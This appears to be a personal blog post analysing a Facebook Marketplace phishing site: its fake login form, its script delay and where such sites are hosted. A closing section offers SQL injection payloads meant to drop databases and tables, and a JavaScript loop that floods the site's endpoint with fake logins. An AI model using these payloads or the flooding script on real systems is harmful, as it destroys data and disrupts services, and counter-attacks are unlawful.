<!--
{
  "title": "FB Marketplace Phishing Website Analysis",
  "time": "2025-04-13T01:21:00.000Z",
  "description": "My Experience with a Facebook Marketplace Phishing Scam Recently, I received a message from a random person on Facebook Marketplace who wanted to trade an item. He provided a link to what he claimed was his listing, but upon closer inspection, I realized it wasn’t a real Facebook Marketplace page...."
}
-->

# My Experience with a Facebook Marketplace Phishing Scam

![facebook-message-image.webp](/images/uploads/facebook-message-image.webp)

Recently, I received a message from a random person on Facebook Marketplace who wanted to trade an item. He provided a link to what he claimed was his listing, but upon closer inspection, I realized it wasn’t a real Facebook Marketplace page. Instead, it was a phishing website designed to look like Facebook, created to steal people’s email addresses, phone numbers, and passwords.


## Understanding Phishing Attacks

Online scams come in many forms, and phishing is one of the most common. Cybercriminals often can't attack large services directly due to strong security measures. Instead, they target individuals through emails, messages, or social media platforms, tricking them into revealing their credentials. These stolen credentials might not only be used for Facebook but also for financial accounts and other services.

Since I encountered this phishing website, I decided to analyze it and learn from it.

---
## Phishing Website Analysis
![phishingwebsiteimage.webp](/images/uploads/phishingwebsiteimage.webp)

### The phishing website’s login form looked like this:
![phishingwebsiteloginform.webp](/images/uploads/phishingwebsiteloginform.webp)

From this form, I could determine that the website's backend is built with PHP, as indicated by the action="do.php" attribute. Additionally, the website doesn’t validate whether the input is an email or a phone number, meaning it accepts both formats.

### The phishing website’s Javascript code:

![phishingwebistescript.webp](/images/uploads/phishingwebistescript.webp)

This script reveals an interesting trick: it displays a loading overlay for five seconds before submitting the form. This delay is likely an attempt to make the login process feel more legitimate to victims.

Additionally, I noticed that some comments in the code were written in Romanian, which suggests that the person who created the phishing site might speak Romanian. However, this does not confirm their nationality, as other Eastern Europeans (such as Russians, Ukrainians, or Poles) may also use Romanian. And this website can be done by a geek job as well. There are people who post a job to copy a website from Upwork.

![upworkwebsitecopyimage.webp](/images/uploads/upworkwebsitecopyimage.webp)

### Where do phishers host their websites?

Most phishers avoid cloud platforms like AWS or Google Cloud, as those services charge based on usage. If someone floods their phishing website with traffic, it could lead to high hosting costs and even credit card cancellations. Instead, they often use cheap shared hosting services, which are easier to shut down when reported.

---
## How could someone attack this phishing website?

> Disclaimer: Attacking someone’s server can be illegal depending on your country’s laws. This content is for educational purposes only—do not use it to harm others.

### 1. SQL injection (Potentially deleting their database)
Older versions of MySQL were vulnerable to SQL injection attacks that could delete databases. Here’s an example of an attack command that could attempt to remove their database:

```
'; DROP DATABASE information_schema; --
```

#### A more advanced version dynamically identifies and deletes tables:
```
'; SET @t = (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1); SET @query = CONCAT('DROP TABLE ', @t); PREPARE stmt FROM @query; EXECUTE stmt; --
```

### 2. Flooding the database with junk data (DDoS-like attack)

A phishing website’s database may not be well-optimized, and flooding it with thousands of fake logins could slow it down or crash it. Since the phishing website redirects after submission, an attacker would need a script that sends junk data without redirection.

Here’s a javascript that could be used:

```
function sendFakeDataRepeatedly(times, delay) {
    let i = 0;
    let interval = setInterval(() => {
        if (i >= times) {
            clearInterval(interval);
            console.log("Finished sending fake data.");
            return;
        }

        let formData = new FormData();
        formData.append("email", `stop.phishing.${i}@please.com`);
        formData.append("password", `stop.phishing.please`);

        fetch("do.php", {  // Change this if the endpoint is different
            method: "POST",
            body: formData,
        })
        .then(response => console.log(`Sent fake data ${i + 1}/${times}`))
        .catch(error => console.error("Error:", error));

        i++;
    }, delay);
}

// Run: Sends 1000 fake entries every 0.5 seconds
sendFakeDataRepeatedly(1000, 500);
```
This script continuously submits fake login credentials to flood the database. If the phishing site is hosted on a cloud-based pay-per-use platform, the increased traffic could drive up their costs significantly.

---
## What happened to the phishing website?

Eventually, the phishing website was shut down by the hosting provider. The phishing website was hosted on a UK-based hosting service, which suspended it after detecting abuse.

---
## Conclusion

Phishing remains a major cybersecurity threat, and attackers constantly find new ways to trick people into revealing their credentials. By analyzing phishing websites, we can better understand how they work and how to protect ourselves and others.

If you ever come across a suspicious website, report it to the relevant authorities and avoid engaging with it. Stay safe online!
